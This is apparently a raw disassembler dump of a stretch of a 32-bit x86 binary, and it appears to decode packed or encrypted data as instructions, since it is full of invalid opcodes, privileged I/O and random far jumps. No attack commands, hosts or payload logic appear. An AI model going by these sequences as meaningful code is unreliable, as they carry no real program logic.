  414ef2:	xchg   ebp,edi
  414ef4:	mov    esp,ss
  414ef6:	stc    
  414ef7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ef8:	stc    
  414ef9:	(bad)  
  414efa:	test   DWORD PTR [eax+0x77],eax
  414efd:	ds cli 
  414eff:	lods   al,BYTE PTR ds:[esi]
  414f00:	sbb    al,0x17
  414f02:	xor    DWORD PTR [ecx],esp
  414f04:	fwait
  414f05:	and    bl,0x93
  414f08:	push   ebp
  414f09:	pusha  
  414f0a:	xor    DWORD PTR [edi],esi
  414f0c:	loope  0x414eba
  414f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f0f:	xchg   BYTE PTR [edi-0x2c],al
  414f12:	dec    esi
  414f13:	xlat   BYTE PTR ds:[ebx]
  414f14:	fs test ah,ah
  414f17:	je     0x414f0a
  414f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f1a:	add    al,bl
  414f1c:	retf   
  414f1d:	in     al,0x61
  414f1f:	or     esp,DWORD PTR [ecx-0x7c58ce6e]
  414f25:	pusha  
  414f26:	jg     0x414f00
  414f28:	adc    dh,BYTE PTR [edx+ebp*2]
  414f2b:	cmp    al,0x1
  414f2d:	pop    es
  414f2e:	stc    
  414f2f:	cmp    cl,BYTE PTR [ebp+0x4a]
  414f32:	push   0xffffffd0
  414f34:	jmp    0x414f50
  414f36:	mov    al,0xe2
  414f38:	mov    al,ds:0x6632b8ba
  414f3e:	pusha  
  414f3f:	cmp    al,0xeb
  414f41:	pop    edx
  414f42:	in     eax,0xe5
  414f44:	add    dh,dh
  414f46:	adc    eax,0xc267168b
  414f4b:	jecxz  0x414f98
  414f4d:	inc    ecx
  414f4e:	test   al,0x2f
  414f50:	pop    ebp
  414f51:	add    al,ah
  414f53:	aaa    
  414f54:	ret    0x2ca3
  414f57:	popa   
  414f58:	pop    es
  414f59:	jg     0x2f628a4f
  414f5f:	jmp    0xf3f7964c
  414f64:	outs   dx,DWORD PTR ds:[esi]
  414f65:	push   ds
  414f66:	lock cmp BYTE PTR [edx-0x21],0x23
  414f6b:	jns    0x414fd3
  414f6d:	in     eax,dx
  414f6e:	clc    
  414f6f:	jle    0x414eff
  414f71:	aad    0x3a
  414f73:	jno    0x414f0b
  414f75:	mov    bl,0xd1
  414f77:	pushf  
  414f78:	sub    edx,DWORD PTR [ebx-0x160eb8d4]
  414f7e:	ret    0xbdd1
  414f81:	lds    esp,FWORD PTR [ebp+0x7b]
  414f84:	xor    eax,0x8fb94669
  414f89:	push   0x7d
  414f8b:	dec    edx
  414f8c:	hlt    
  414f8d:	fidivr DWORD PTR [eax]
  414f8f:	hlt    
  414f90:	cwde   
  414f91:	cdq    
  414f92:	and    BYTE PTR [eax],ch
  414f94:	sti    
  414f95:	mov    esi,0x23bb3fd3
  414f9a:	retf   0x83b1
  414f9d:	jmp    0xc321:0xe4f2bf53
  414fa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fa5:	and    esp,esi
  414fa7:	push   ss
  414fa8:	pop    esi
  414fa9:	and    ebx,ecx
  414fab:	fbstp  TBYTE PTR [edi+esi*8+0x754f2078]
  414fb2:	call   0xab2a:0x451bb7d0
  414fb9:	add    BYTE PTR [ebx],al
  414fbb:	arpl   WORD PTR [ecx-0x35],ax
  414fbe:	mov    al,ds:0xc75a269f
  414fc3:	stos   BYTE PTR es:[edi],al
  414fc4:	push   ss
  414fc5:	sti    
  414fc6:	pop    ds
  414fc7:	and    DWORD PTR [edx],ecx
  414fc9:	sub    BYTE PTR [ebx+0x1213b6a9],bl
  414fcf:	mov    DWORD PTR [edi-0x4a5e7808],eax
  414fd5:	push   ds
  414fd6:	xchg   ecx,eax
  414fd7:	sub    BYTE PTR [edi+0x2666149],al
  414fdd:	push   ebp
  414fde:	jl     0x414fb3
  414fe0:	mov    eax,0x96c8011d
  414fe5:	xchg   esp,eax
  414fe6:	mov    edx,DWORD PTR ds:0x391178a3
  414fec:	fdivr  QWORD PTR [edx+0x37]
  414fef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ff0:	into   
  414ff1:	mov    ebx,0xf0fbbea6
  414ff6:	enter  0x1cf5,0xb0
  414ffa:	outs   dx,DWORD PTR ds:[esi]
  414ffb:	imul   ecx,DWORD PTR [esi],0xa8debe87
  415001:	ins    DWORD PTR es:[edi],dx
  415002:	and    ebx,DWORD PTR [ecx]
  415004:	fistp  WORD PTR [ecx+0x7288c815]
  41500a:	pop    ecx
  41500b:	inc    esi
  41500c:	in     eax,0x7
  41500e:	xlat   BYTE PTR ds:[ebx]
  41500f:	mov    ss,ecx
  415011:	dec    ebp
  415012:	inc    ebx
  415013:	pop    esp
  415014:	and    BYTE PTR [ebx+0x3d],ah
  415017:	jmp    0x414fc9
  415019:	jne    0x414fc2
  41501b:	out    dx,eax
  41501c:	inc    esi
  41501d:	cmp    eax,0x56f3006b
  415022:	(bad)  
  415024:	fdivr  st(7),st
  415026:	ds icebp 
  415028:	add    dh,BYTE PTR [ecx]
  41502a:	mov    cl,0xfb
  41502c:	test   al,0x6b
  41502e:	mov    ds:0x7615f8eb,eax
  415033:	push   ebp
  415034:	xlat   BYTE PTR ds:[ebx]
  415035:	mov    al,0x53
  415037:	rcl    BYTE PTR [edx-0x4f23bdda],1
  41503d:	ins    BYTE PTR es:[di],dx
  41503f:	loop   0x414ff5
  415041:	mov    ds:0xafa43d68,al
  415046:	jmp    0xf6e23575
  41504b:	stc    
  41504c:	ins    BYTE PTR es:[edi],dx
  41504d:	pop    edi
  41504e:	xchg   BYTE PTR [eax],bl
  415050:	push   ecx
  415051:	pop    ebp
  415052:	sub    bh,BYTE PTR [ecx+ebp*2-0x21658301]
  415059:	fwait
  41505a:	push   cs
  41505b:	sub    BYTE PTR [ebx+0x5f],dh
  41505e:	cs in  al,0x31
  415061:	mov    ss,WORD PTR [esi-0x17]
  415064:	jo     0x415045
  415066:	xlat   BYTE PTR ds:[ebx]
  415067:	push   0x519bc0c5
  41506c:	xchg   esp,eax
  41506d:	xchg   ecx,eax
  41506e:	dec    ebp
  415070:	xlat   BYTE PTR ds:[ebx]
  415071:	mov    WORD PTR [edx+0x3a8aea64],gs
  415077:	xchg   DWORD PTR [eax],eax
  415079:	(bad)  
  41507a:	ffree  st(1)
  41507c:	xor    BYTE PTR [ebx+0x7],ah
  41507f:	and    cl,BYTE PTR [esi]
  415081:	and    BYTE PTR [esi],0xd6
  415084:	scas   al,BYTE PTR es:[edi]
  415085:	stos   DWORD PTR es:[edi],eax
  415086:	fisubr DWORD PTR [eax+0x4dca6d79]
  41508c:	inc    esi
  41508d:	ja     0x415023
  41508f:	mov    WORD PTR [edx-0x6bec2763],cs
  415095:	mov    BYTE PTR [esi+0xfd3c084],al
  41509b:	cmp    edi,DWORD PTR [ecx+0x1883c59d]
  4150a1:	fsubr  DWORD PTR ds:0xad97d4d1
  4150a7:	into   
  4150a8:	mov    edx,0x9f12526d
  4150ad:	data16 and al,0xb8
  4150b0:	mov    al,0xa4
  4150b2:	fxtract 
  4150b4:	sub    BYTE PTR [esi+0x22],bl
  4150b7:	stos   DWORD PTR es:[edi],eax
  4150b8:	outs   dx,DWORD PTR ds:[esi]
  4150b9:	pop    esp
  4150ba:	mov    edi,0x26596671
  4150bf:	mov    DWORD PTR [esp+edi*4+0x66c5ae3d],ecx
  4150c6:	push   ebx
  4150c7:	cmc    
  4150c8:	xchg   ebp,eax
  4150c9:	int3   
  4150ca:	(bad)  
  4150cc:	jge    0x415103
  4150ce:	inc    esi
  4150cf:	or     al,0xf0
  4150d1:	adc    edx,DWORD PTR [eax]
  4150d3:	dec    edi
  4150d4:	pop    ds
  4150d5:	lea    esi,[edx]
  4150d7:	sub    eax,0x2e1dce66
  4150dc:	in     eax,0xf1
  4150de:	repnz mov ch,BYTE PTR [edi]
  4150e1:	out    0x1a,eax
  4150e3:	mov    edi,es
  4150e5:	mov    ah,BYTE PTR [eax]
  4150e7:	mov    edi,0xb3ba0d1a
  4150ec:	fmulp  st(7),st
  4150ee:	icebp  
  4150ef:	call   0xf4e6:0x9618612
  4150f6:	retf   0x8ac5
  4150f9:	mov    ch,0x6
  4150fb:	retf   
  4150fc:	ret    
  4150fd:	jbe    0x415107
  4150ff:	loopne 0x4150cc
  415101:	lock mov edx,0xf38416
  415107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415108:	daa    
  415109:	and    ecx,DWORD PTR [eax-0x3424a045]
  41510f:	mov    ds:0xf49705ee,eax
  415114:	cmp    esi,DWORD PTR [esi]
  415116:	sahf   
  415117:	xabort 0x76
  41511a:	test   eax,0xe91fbea0
  41511f:	test   al,0x2c
  415121:	lock sub eax,0xc11166e7
  415127:	ins    BYTE PTR es:[edi],dx
  415128:	stc    
  415129:	pushf  
  41512a:	sbb    ah,BYTE PTR cs:0x3fbac303
  415131:	mov    WORD PTR [eax+0x6e8c6fd0],fs
  415137:	mov    al,ds:0x34376b39
  41513c:	aaa    
  41513d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41513e:	imul   DWORD PTR [edi-0x790a4129]
  415144:	adc    edx,eax
  415146:	xchg   DWORD PTR [esi-0x7a],edx
  415149:	test   al,0xb
  41514b:	jno    0x4150eb
  41514d:	sbb    al,0x9
  41514f:	(bad)  
  415151:	js     0x415173
  415153:	pop    edi
  415154:	or     DWORD PTR [esi+0x5c],ecx
  415157:	in     eax,0xde
  415159:	mov    dh,0xf1
  41515b:	aam    0xbb
  41515d:	push   ds
  41515e:	rcr    BYTE PTR [edx+0x191335f0],1
  415164:	je     0x41516f
  415166:	adc    BYTE PTR [ebp-0x35b0b8d6],0xb4
  41516d:	ja     0x415101
  41516f:	loopne 0x415112
  415171:	outs   dx,DWORD PTR ds:[esi]
  415172:	push   ds
  415173:	adc    cl,BYTE PTR [edi]
  415175:	loop   0x415187
  415177:	adc    DWORD PTR [ebx],esi
  415179:	enter  0xf113,0xf7
  41517d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41517e:	imul   ecx,DWORD PTR [ebp+0xa],0x56
  415182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415183:	cli    
  415184:	sbb    DWORD PTR [esp+edx*1+0x8],ebx
  415188:	jg     0x41510a
  41518a:	fcomip st,st(2)
  41518c:	sub    al,BYTE PTR [ebx]
  41518e:	and    ah,BYTE PTR [esi+0x4928e94d]
  415194:	mov    ecx,0xfb7a8c8b
  415199:	add    al,0xa3
  41519b:	jns    0x4151ca
  41519d:	retf   
  41519e:	shr    BYTE PTR [ebx],0x12
  4151a1:	mov    bh,0xc2
  4151a3:	jns    0x4151dc
  4151a5:	mov    edi,0x906116e3
  4151aa:	push   es
  4151ab:	cld    
  4151ac:	sbb    eax,0xea326393
  4151b1:	popf   
  4151b2:	in     al,dx
  4151b3:	xor    DWORD PTR [ebx-0x365a7972],ecx
  4151b9:	sbb    eax,0xc9306fc9
  4151be:	and    ch,BYTE PTR [edx-0x3f]
  4151c1:	(bad)  
  4151c2:	(bad)  [ecx]
  4151c4:	stos   BYTE PTR es:[edi],al
  4151c5:	dec    ebx
  4151c6:	in     al,0xb
  4151c8:	inc    eax
  4151c9:	or     DWORD PTR [esi+0x62e9225],ecx
  4151cf:	not    esi
  4151d1:	jne    0x41517d
  4151d3:	or     DWORD PTR ds:0xae92e33,ebp
  4151d9:	or     eax,0x1cfa006
  4151de:	outs   dx,BYTE PTR ds:[esi]
  4151df:	sbb    al,0xd4
  4151e1:	ror    ebp,0xd0
  4151e4:	mov    ch,0x3a
  4151e6:	aam    0x72
  4151e8:	or     BYTE PTR ds:0xf7cc2005,bl
  4151ee:	or     esi,ebp
  4151f0:	stos   DWORD PTR es:[edi],eax
  4151f1:	push   ecx
  4151f2:	push   ds
  4151f3:	(bad)  
  4151f4:	sbb    BYTE PTR [ecx],al
  4151f6:	stos   BYTE PTR es:[edi],al
  4151f7:	xchg   DWORD PTR [ebp+0x58],eax
  4151fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151fb:	fiadd  DWORD PTR [esi-0x2cb80601]
  415201:	pop    ss
  415202:	jp     0x4151e8
  415204:	inc    edx
  415205:	mov    ecx,ebp
  415207:	mov    ebx,0xd37bbb12
  41520c:	shl    DWORD PTR ds:0x503d3b6,cl
  415212:	pop    edx
  415213:	repnz push esi
  415215:	iret   
  415216:	xchg   esp,eax
  415217:	inc    esi
  415218:	mov    bh,0x65
  41521a:	iret   
  41521b:	js     0x41526c
  41521d:	dec    edi
  41521e:	popf   
  41521f:	(bad)  
  415220:	(bad)  
  415221:	inc    ecx
  415222:	jmp    0x4151c7
  415224:	test   eax,0x872f1091
  415229:	xor    BYTE PTR [ebx-0x6e],bh
  41522c:	xor    al,BYTE PTR [edx]
  41522e:	sub    BYTE PTR [ecx-0x26],dh
  415231:	shl    BYTE PTR [ebx-0x6dbbcad6],0xff
  415238:	sahf   
  415239:	xchg   esi,eax
  41523a:	rol    BYTE PTR [edx],cl
  41523c:	dec    ebx
  41523d:	adc    al,BYTE PTR [edi+0x23]
  415240:	inc    ebx
  415241:	mov    ah,0xbb
  415243:	cwde   
  415244:	ret    
  415245:	jp     0x415283
  415247:	addr16 jmp 0xe23f:0xc7bc2c86
  41524f:	js     0x415249
  415251:	(bad)  
  415252:	(bad)  
  415253:	fsubr  DWORD PTR [eax+0x37]
  415256:	mov    cl,0xe6
  415258:	(bad)  
  415259:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41525a:	xchg   edi,eax
  41525b:	sub    esp,DWORD PTR [ecx]
  41525d:	xor    bl,BYTE PTR [edi]
  41525f:	cld    
  415260:	daa    
  415261:	leave  
  415262:	sub    DWORD PTR [eax-0x73f9eeac],0x28
  415269:	mov    ds:0x71c7b55b,al
  41526e:	pop    ebp
  41526f:	mov    esi,0x34af5c01
  415274:	retf   
  415275:	adc    dl,BYTE PTR [eax]
  415277:	xor    bh,al
  415279:	aaa    
  41527a:	pop    edi
  41527b:	retf   0xaa0e
  41527e:	sbb    al,0xea
  415280:	sbb    bl,ah
  415282:	sub    eax,0xc1d20c0e
  415287:	push   esi
  415288:	ret    0xfa94
  41528b:	push   es
  41528c:	in     eax,0xb4
  41528e:	out    0x3a,al
  415290:	mov    ebp,0xbf79b7c3
  415295:	inc    ebx
  415296:	inc    eax
  415297:	jmp    0x33bb1912
  41529c:	arpl   WORD PTR [ebx+0x5b70bd62],bp
  4152a2:	sbb    ch,ch
  4152a4:	sub    al,0x17
  4152a6:	out    dx,al
  4152a7:	(bad)  
  4152a8:	pop    ecx
  4152a9:	cmp    ecx,DWORD PTR [edi]
  4152ab:	inc    ebp
  4152ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152ad:	xor    DWORD PTR [esi],esp
  4152af:	jmp    0x41526d
  4152b1:	sahf   
  4152b2:	add    ch,BYTE PTR [ecx+0x6]
  4152b5:	(bad)  
  4152b6:	push   ebx
  4152b7:	lahf   
  4152b8:	jno    0x41527b
  4152ba:	retf   
  4152bb:	push   eax
  4152bc:	mov    bl,0x48
  4152be:	aam    0x51
  4152c0:	ja     0x41525c
  4152c2:	jmp    0x1dc78248
  4152c7:	mov    ecx,edx
  4152c9:	int    0x88
  4152cb:	mov    bl,0x29
  4152cd:	sti    
  4152ce:	and    BYTE PTR [edi+0x3],dh
  4152d1:	jmp    0x41525a
  4152d3:	hlt    
  4152d4:	inc    ebp
  4152d5:	rol    BYTE PTR [ebp+0x25a742b5],0x6c
  4152dc:	mov    eax,ds:0x8fb96bc2
  4152e1:	pop    ebp
  4152e2:	sub    esp,edi
  4152e4:	jnp    0x415291
  4152e6:	arpl   WORD PTR [edi],sp
  4152e8:	pop    ebp
  4152e9:	xchg   ebx,eax
  4152ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152eb:	in     al,dx
  4152ec:	pop    ebp
  4152ed:	and    eax,DWORD PTR [eax+0x3c98d90c]
  4152f3:	leave  
  4152f4:	mov    bl,0xb0
  4152f6:	dec    edx
  4152f7:	mov    eax,ds:0x55c7e13d
  4152fc:	add    DWORD PTR [edx],edx
  4152fe:	jmp    0x485f915c
  415303:	pushf  
  415304:	cmp    al,0xea
  415307:	xchg   ecx,eax
  415308:	out    0x99,eax
  41530a:	xor    dh,BYTE PTR [edi+0x7c]
  41530d:	adc    DWORD PTR [ecx-0x4d],ecx
  415310:	mov    ds:0x57006396,al
  415315:	xor    al,0xe3
  415317:	add    DWORD PTR [ecx-0x47],edi
  41531a:	xchg   ebx,eax
  41531b:	xor    esi,DWORD PTR [esi+0x67]
  41531e:	mov    ds:0x7b0c76e6,al
  415323:	mov    al,ds:0xc7699df4
  415328:	sub    eax,edx
  41532a:	cli    
  41532b:	aad    0x8e
  41532d:	inc    esi
  41532e:	addr16 shl esi,cl
  415331:	(bad)  [ecx]
  415333:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415334:	(bad)  [ecx-0x1e151617]
  41533a:	in     ax,0x6b
  41533d:	ja     0x4152ef
  41533f:	push   ecx
  415340:	mov    ds:0xcc013438,eax
  415345:	call   0x2e8e:0x91e1371e
  41534c:	adc    al,0xb7
  41534e:	loopne 0x4153c9
  415350:	xchg   ebx,eax
  415351:	push   es
  415352:	mov    dh,BYTE PTR ds:0xbad1d47a
  415358:	cld    
  415359:	addr16 in eax,0xfb
  41535c:	hlt    
  41535d:	sbb    BYTE PTR [esi+edi*8-0x14],0xae
  415362:	pop    edx
  415363:	in     eax,0x73
  415365:	push   esp
  415366:	retf   
  415367:	push   0x9375ea15
  41536c:	cdq    
  41536d:	xor    bh,bh
  41536f:	imul   edi,esp,0xab51be7e
  415375:	aas    
  415376:	jmp    0x4153be
  415378:	aam    0xa7
  41537a:	pop    ds
  41537b:	cmp    eax,0x30ef683f
  415380:	sub    al,0x92
  415382:	or     DWORD PTR [ecx+0x77],edx
  415385:	xchg   BYTE PTR [esp+esi*1-0x4e940f12],bl
  41538c:	sub    bh,BYTE PTR [edi-0x13]
  41538f:	and    al,0xfc
  415391:	call   DWORD PTR [ecx-0x7dce034]
  415397:	stos   BYTE PTR es:[edi],al
  415398:	aam    0xb4
  41539a:	mov    al,ds:0xd8b77ed6
  41539f:	not    BYTE PTR [esi]
  4153a1:	and    al,0x59
  4153a3:	sbb    eax,0xb3f6eb71
  4153a8:	retf   0x639c
  4153ab:	xchg   BYTE PTR [edi],dl
  4153ad:	adc    DWORD PTR [edi+0x6029925b],esi
  4153b3:	fwait
  4153b4:	push   0x74
  4153b6:	pop    esp
  4153b7:	(bad)
  4153ba:	and    eax,0x27a6bb0a
  4153bf:	adc    esi,ecx
  4153c1:	aad    0xdf
  4153c3:	outs   dx,BYTE PTR ds:[esi]
  4153c4:	xchg   ebx,eax
  4153c5:	sti    
  4153c6:	dec    esi
  4153c7:	jae    0x41540d
  4153c9:	pop    esi
  4153ca:	fstp   TBYTE PTR [ebx-0x10]
  4153cd:	xchg   esi,eax
  4153ce:	jnp    0x41543f
  4153d0:	mov    bl,0xc2
  4153d2:	repnz retf 0x1b06
  4153d6:	loop   0x4153db
  4153d8:	pop    ebp
  4153d9:	cmp    esi,ebp
  4153db:	fwait
  4153dc:	lock sub ebp,ebp
  4153df:	popa   
  4153e0:	add    al,0xad
  4153e2:	out    0x8d,eax
  4153e4:	cmp    al,0x4c
  4153e6:	inc    ecx
  4153e7:	retf   
  4153e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153e9:	sahf   
  4153ea:	loope  0x415420
  4153ec:	sbb    eax,0x6b9f2d1a
  4153f1:	(bad)
  4153f4:	fwait
  4153f5:	mov    dh,0xd2
  4153f7:	shl    BYTE PTR [esi],1
  4153f9:	add    bl,dl
  4153fb:	aaa    
  4153fc:	in     al,dx
  4153fd:	lahf   
  4153fe:	test   DWORD PTR [esi+0x4b],ebp
  415401:	es popf 
  415403:	inc    BYTE PTR [edx]
  415405:	ror    edx,cl
  415407:	out    dx,eax
  415408:	mov    ecx,0x335761f9
  41540d:	mov    ebp,0x4b4e0f14
  415412:	sub    al,0xe3
  415414:	lahf   
  415415:	adc    DWORD PTR [ebp+0x3a],ecx
  415418:	fisubr DWORD PTR [ebp+0x2]
  41541b:	mov    eax,0x609e51ec
  415420:	in     al,dx
  415421:	outs   dx,BYTE PTR ds:[esi]
  415422:	aaa    
  415423:	dec    ecx
  415424:	adc    esi,0xc8fe097a
  41542a:	xchg   edi,eax
  41542b:	sub    al,BYTE PTR [edi+0x52540644]
  415431:	add    DWORD PTR [esi+0x56],esi
  415434:	cs loopne 0x41545f
  415437:	pop    es
  415438:	jmp    0x415459
  41543a:	das    
  41543b:	and    edi,ebx
  41543d:	mov    ecx,0x59f65d46
  415442:	fstp   DWORD PTR [edx-0x59]
  415445:	push   ecx
  415446:	inc    edx
  415447:	repz mov WORD PTR [eax-0x7e],ds
  41544b:	(bad)  
  41544c:	pop    ds
  41544d:	mov    ds:0xcd3ec884,al
  415452:	(bad)  
  415454:	rcl    DWORD PTR [esi-0x6d52635a],cl
  41545a:	in     al,0x93
  41545c:	pop    edx
  41545d:	jecxz  0x415446
  41545f:	push   0xffffff9f
  415461:	mov    dh,0xab
  415463:	add    al,0x3e
  415465:	mov    WORD PTR [edx+0x4a9f66f8],ds
  41546b:	push   es
  41546c:	test   al,0xa6
  41546e:	jae    0x415447
  415470:	sub    ebx,DWORD PTR [ebp-0x42f4ab0d]
  415476:	mov    ebx,0x43e53ac3
  41547b:	sbb    eax,0x26f33071
  415480:	push   edx
  415481:	popa   
  415482:	adc    DWORD PTR [ebx+0x464806ff],0x44
  415489:	stos   DWORD PTR es:[edi],eax
  41548a:	rol    DWORD PTR [ebp-0x2bb705a3],0xc2
  415491:	or     DWORD PTR [edi],esi
  415493:	pop    edi
  415494:	sti    
  415495:	es mov esp,0x839495e1
  41549b:	js     0x41541e
  41549d:	pop    ecx
  41549e:	jmp    0x4be9d8d6
  4154a3:	push   ebx
  4154a4:	dec    esp
  4154a5:	leave  
  4154a6:	push   ebp
  4154a7:	call   0x15a7ec40
  4154ac:	je     0x415439
  4154ae:	mov    eax,0x644b52f
  4154b3:	jl     0x415487
  4154b5:	fs jecxz 0x4154e9
  4154b8:	ret    0x940c
  4154bb:	in     eax,0xf9
  4154bd:	mov    al,0x43
  4154bf:	jne    0x4154a5
  4154c1:	pop    ss
  4154c2:	repz mov ds:0x612e80a2,al
  4154c8:	jns    0x41545f
  4154ca:	imul   ecx,DWORD PTR [ebx+ebp*8],0xffffffe3
  4154ce:	mov    dh,0xe9
  4154d0:	das    
  4154d1:	push   edx
  4154d2:	daa    
  4154d3:	test   DWORD PTR [ebp-0x16bd1f21],ecx
  4154d9:	popa   
  4154da:	inc    ecx
  4154db:	pop    ebp
  4154dc:	xor    edx,DWORD PTR [esi+edx*1-0x51b6c1de]
  4154e3:	cmp    eax,0x28865d4
  4154e8:	imul   ebx,DWORD PTR [ecx+0x41],0xe2ad75ad
  4154ef:	dec    ecx
  4154f0:	stos   BYTE PTR es:[edi],al
  4154f1:	jecxz  0x4154d1
  4154f3:	jne    0x4154c6
  4154f5:	cmp    al,0x96
  4154f7:	pop    eax
  4154f8:	repz add edx,ecx
  4154fb:	lea    esp,[eax-0x5b]
  4154fe:	(bad)  
  4154ff:	es push 0xffffffdf
  415502:	(bad)  
  415503:	ds test eax,0xc9a11937
  415509:	or     edx,ebp
  41550b:	mov    edi,0x5c4c1f9a
  415510:	ins    BYTE PTR es:[edi],dx
  415511:	(bad)  
  415512:	jb     0x4154e1
  415514:	mov    bl,0x83
  415516:	or     BYTE PTR [esi+0x35],0x17
  41551a:	or     DWORD PTR [ebp+0x1c],esp
  41551d:	pop    ebp
  41551e:	cmp    al,0xe6
  415520:	sbb    BYTE PTR [esi],ch
  415522:	inc    esp
  415523:	addr16 mov cl,0xa8
  415526:	jecxz  0x4154df
  415528:	bound  esp,QWORD PTR [ecx+0x2b]
  41552b:	or     eax,0x8f586aa5
  415530:	je     0x415593
  415532:	mov    ebp,0x8a79776d
  415537:	and    DWORD PTR [ecx+eiz*4-0xc],esp
  41553b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41553c:	adc    BYTE PTR [ebx-0x76a3b4f5],dh
  415542:	add    DWORD PTR [ebx],0xd8665082
  415548:	or     bh,dh
  41554a:	xchg   esi,ecx
  41554c:	pop    edx
  41554d:	mov    ch,0xe3
  41554f:	cmp    DWORD PTR [eax+0x1b],0xffffff8b
  415553:	mov    ecx,0x4a53acf
  415558:	arpl   WORD PTR [ebp-0x404207bd],cx
  41555e:	mov    dh,dh
  415560:	out    dx,al
  415561:	loop   0x4154f0
  415563:	arpl   dx,si
  415565:	pop    ss
  415566:	fistp  DWORD PTR [esi]
  415568:	push   ds
  415569:	inc    esp
  41556a:	mov    esi,0xe3a15a77
  41556f:	mov    cs,WORD PTR [edx+0x3229971f]
  415575:	ins    DWORD PTR es:[edi],dx
  415576:	je     0x4155c2
  415578:	jne    0x4155e2
  41557a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41557b:	add    bh,al
  41557d:	test   eax,0x6d15282d
  415582:	stos   DWORD PTR es:[edi],eax
  415583:	jg     0x41552a
  415585:	push   0x7e
  415587:	push   esp
  415588:	sub    al,0x3
  41558a:	jae    0x4155db
  41558c:	add    edx,0x5d3afe44
  415592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415593:	ja     0x4155ef
  415595:	rcl    DWORD PTR [eax+esi*2-0x27c7369d],1
  41559c:	and    bh,BYTE PTR [esi]
  41559e:	fsubr  QWORD PTR [eax-0x4e]
  4155a1:	inc    edi
  4155a2:	sbb    DWORD PTR [edx-0x394ce8df],ebx
  4155a8:	pop    ebp
  4155a9:	mov    ecx,gs
  4155ab:	arpl   WORD PTR [edx],si
  4155ad:	std    
  4155ae:	(bad)  [edx+0x1e]
  4155b1:	scas   eax,DWORD PTR es:[edi]
  4155b2:	scas   eax,DWORD PTR es:[edi]
  4155b3:	ja     0x415628
  4155b5:	fld    QWORD PTR [ebp-0xf]
  4155b8:	jl     0x4155d7
  4155ba:	adc    al,0xdb
  4155bc:	pop    esp
  4155bd:	and    bl,cl
  4155bf:	xlat   BYTE PTR ds:[ebx]
  4155c0:	sub    BYTE PTR [ecx+edx*1-0x51384764],ah
  4155c7:	xor    cl,cl
  4155c9:	push   ebx
  4155ca:	jmp    0x235c:0x1a1f5e38
  4155d1:	(bad)  
  4155d2:	das    
  4155d3:	ret    
  4155d4:	stc    
  4155d5:	and    eax,0xe59ab492
  4155da:	mov    bh,0x51
  4155dc:	mov    bl,BYTE PTR [edx]
  4155de:	sbb    al,0x4a
  4155e0:	call   DWORD PTR [ebx+0x3ac3b9a5]
  4155e6:	jecxz  0x4155a9
  4155e8:	fs addr16 imul ecx,ecx,0x15
  4155ed:	je     0x415615
  4155ef:	cmp    al,0x7
  4155f1:	retf   0x173a
  4155f4:	(bad)  
  4155f5:	mov    eax,ds:0x6d832871
  4155fa:	add    ah,dh
  4155fc:	mov    ah,0x8d
  4155fe:	sub    dh,ah
  415600:	xor    BYTE PTR [ebx],bh
  415602:	inc    esi
  415603:	sbb    eax,0x9b0e4a1
  415608:	repz imul esi,DWORD PTR [ecx+0x320a41ce],0xffffff8e
  415610:	inc    DWORD PTR [ebx+0x1d195a5]
  415616:	stos   DWORD PTR es:[edi],eax
  415617:	popf   
  415618:	push   cs
  415619:	dec    esp
  41561a:	fmul   QWORD PTR [esi+0x3230e52f]
  415620:	mov    ecx,0xb3091f67
  415625:	sti    
  415626:	in     eax,0x61
  415628:	add    BYTE PTR [edx-0x10137f8d],bh
  41562e:	out    0x97,al
  415630:	mov    bl,0xb7
  415632:	fst    QWORD PTR [eax+0x6dcfc822]
  415638:	fstp   TBYTE PTR [ecx-0x20]
  41563b:	outs   dx,DWORD PTR ds:[esi]
  41563c:	and    DWORD PTR [ebx+0x49],ebx
  41563f:	and    DWORD PTR [ebp-0x28e04e7f],ebx
  415645:	or     al,ah
  415647:	dec    edx
  415648:	outs   dx,DWORD PTR ds:[esi]
  415649:	push   ss
  41564a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41564b:	mov    BYTE PTR [ebx],ch
  41564d:	xor    bl,al
  41564f:	lds    esp,FWORD PTR [edi+ecx*4+0x6b]
  415653:	inc    eax
  415654:	bnd ja 0x415625
  415657:	sub    al,0x76
  415659:	mov    bh,BYTE PTR [edx]
  41565b:	push   DWORD PTR [ebx-0x15987081]
  415661:	add    DWORD PTR [edx+0x57],ebp
  415664:	adc    BYTE PTR [ecx],al
  415666:	or     esi,DWORD PTR [ebx]
  415668:	pop    ebp
  415669:	mov    DWORD PTR [edi],esi
  41566b:	add    edi,DWORD PTR [ebp-0x136d86b0]
  415671:	cmp    eax,0xb1fb2fc
  415676:	push   edx
  415677:	xchg   edx,eax
  415678:	repz dec edx
  41567a:	cmp    ebp,edx
  41567c:	dec    esp
  41567d:	xchg   esi,eax
  41567e:	lock mov dl,0x7e
  415681:	pop    ebp
  415682:	xchg   esi,eax
  415683:	ret    0xda3d
  415686:	pop    es
  415687:	pop    edi
  415688:	sti    
  415689:	push   cs
  41568a:	jmp    0x4156fc
  41568c:	xor    eax,0xc717e25e
  415691:	ins    DWORD PTR es:[edi],dx
  415692:	fs in  eax,0xb4
  415695:	xor    DWORD PTR [eax-0x6c],edx
  415698:	ret    
  415699:	and    ch,BYTE PTR [edx]
  41569b:	aad    0xb1
  41569d:	ret    0xb7c1
  4156a0:	fsub   QWORD PTR [ecx-0x5]
  4156a3:	cdq    
